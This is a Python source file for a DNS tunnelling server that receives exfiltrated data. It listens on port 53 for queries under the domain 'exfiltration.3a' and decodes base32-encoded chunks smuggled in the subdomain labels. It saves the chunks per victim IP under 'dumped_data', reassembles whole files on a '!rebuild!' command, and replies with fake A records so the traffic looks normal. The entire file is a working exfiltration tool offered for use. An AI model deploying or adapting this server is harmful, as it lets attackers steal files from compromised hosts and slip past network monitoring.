import os
import socket
import base64

LISTEN_IP = '0.0.0.0'
LISTEN_PORT = 53
DOMAIN = 'exfiltration.3a'

def fix_b32_padding(s: str) -> str:
    return s + "=" * ((8 - len(s) % 8) % 8)

def extract_labels(data):
    labels = []
    i = 12  # DNS header offset
    length = data[i]
    while length != 0:
        labels.append(data[i+1:i+1+length].decode())
        i += length + 1
        length = data[i]
    return labels, i + 1

def build_response(data, end_offset):
    transaction_id = data[:2]
    flags = b'\x81\x80'  # Standard DNS response flags
    qdcount = b'\x00\x01'
    ancount = b'\x00\x01'
    nscount = arcount = b'\x00\x00'
    header = transaction_id + flags + qdcount + ancount + nscount + arcount
    question = data[12:end_offset + 4]

    # Minimal A record response (fake IP)
    name = b'\xc0\x0c'  # Pointer to domain name
    type_ = b'\x00\x01'  # A record
    class_ = b'\x00\x01'  # IN class
    ttl = b'\x00\x00\x00\x3c'  # TTL 60 seconds
    rdlength = b'\x00\x04'
    rdata = socket.inet_aton('10.0.0.1')
    answer = name + type_ + class_ + ttl + rdlength + rdata

    return header + question + answer

def save_chunk_to_disk(client_ip, filename, chunk_index, chunk_data_b64):
    output_dir = os.path.join("dumped_data", client_ip)
    os.makedirs(output_dir, exist_ok=True)
    chunk_filename = f"{filename}.chunk{chunk_index:05d}.b64"
    chunk_path = os.path.join(output_dir, chunk_filename)

    # Write chunk base64 data to its own file
    with open(chunk_path, 'w') as f:
        f.write(chunk_data_b64)
    print(f"[+] Saved chunk {chunk_index} for '{filename}' from {client_ip}")

def reconstruct_file(client_ip, filename):
    """
    Read all chunk files for this client & filename, order by chunk index,
    decode base64 and write full binary file.
    """
    output_dir = os.path.join("dumped_data", client_ip)
    if not os.path.exists(output_dir):
        print(f"[!] No data directory for {client_ip}")
        return

    # Find all chunk files matching filename
    chunks = []
    for fname in os.listdir(output_dir):
        if fname.startswith(filename) and fname.endswith('.b64'):
            try:
                idx_str = fname.split('.chunk')[1].split('.b64')[0]
                idx = int(idx_str)
                chunks.append((idx, os.path.join(output_dir, fname)))
            except Exception:
                pass

    if not chunks:
        print(f"[!] No chunks found to reconstruct '{filename}' for {client_ip}")
        return

    chunks.sort(key=lambda x: x[0])

    combined_b64 = ""
    for idx, chunk_path in chunks:
        with open(chunk_path, 'r') as f:
            combined_b64 += f.read().strip()

    try:
        binary_data = base64.b64decode(combined_b64)
    except Exception as e:
        print(f"[!] Failed to decode base64 for {filename} from {client_ip}: {e}")
        return

    # Write final binary file
    final_path = os.path.join(output_dir, filename)
    with open(final_path, 'wb') as f:
        f.write(binary_data)

    print(f"[+] Reconstructed file saved: {final_path}")

    # Optionally, delete chunk files after reconstruction
    for _, chunk_path in chunks:
        os.remove(chunk_path)
    print(f"[+] Deleted {len(chunks)} chunk files after reconstruction")

def process_payload(payload, client_ip):
    """
    Handles payloads of form:
    - filename|--chunk_index|--base64_chunk_data
    - !rebuild! command to reconstruct files
    """
    if payload.strip() == "!rebuild!":
        print(f"[+] Rebuild command received from {client_ip}")
        output_dir = os.path.join("dumped_data", client_ip)
        if not os.path.exists(output_dir):
            print(f"[!] No data to rebuild for {client_ip}")
            return

        # Rebuild all files by detecting unique filenames from chunk files
        files_to_rebuild = set()
        for fname in os.listdir(output_dir):
            if fname.endswith('.b64'):
                original_filename = fname.split('.chunk')[0]
                files_to_rebuild.add(original_filename)

        for filename in files_to_rebuild:
            reconstruct_file(client_ip, filename)
        return

    # Otherwise, parse chunk info
    try:
        filename, chunk_index_str, chunk_data_b64 = payload.split("|--", 2)
        chunk_index = int(chunk_index_str)
    except Exception:
        print(f"[!] Invalid payload format from {client_ip}: {payload}")
        return

    save_chunk_to_disk(client_ip, filename, chunk_index, chunk_data_b64)

def start_dns_tunnel():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((LISTEN_IP, LISTEN_PORT))
    print(f"[+] DNS tunnel server listening on {LISTEN_IP}:{LISTEN_PORT} for domain: {DOMAIN}")

    while True:
        data, addr = sock.recvfrom(512)
        try:
            labels, end_offset = extract_labels(data)
        except Exception as e:
            print(f"[!] Failed to extract labels from query: {e}")
            continue

        if labels and '.'.join(labels[-2:]) == DOMAIN:
            encoded = ''.join(labels[:-2])
            try:
                decoded_bytes = base64.b32decode(fix_b32_padding(encoded.upper()))
                payload_str = decoded_bytes.decode('utf-8', errors='ignore')
                process_payload(payload_str, addr[0])
            except Exception as e:
                print(f"[!] Failed to decode/process payload from {addr[0]}: {e}")
        else:
            print(f"[?] Ignored non-target domain query: {'.'.join(labels)}")

        response = build_response(data, end_offset)
        sock.sendto(response, addr)

if __name__ == '__main__':
    try:
        start_dns_tunnel()
    except PermissionError:
        print("[X] Permission denied. Run as root to bind port 53.")
    except KeyboardInterrupt:
        print("\n[!] Server stopped by user.")

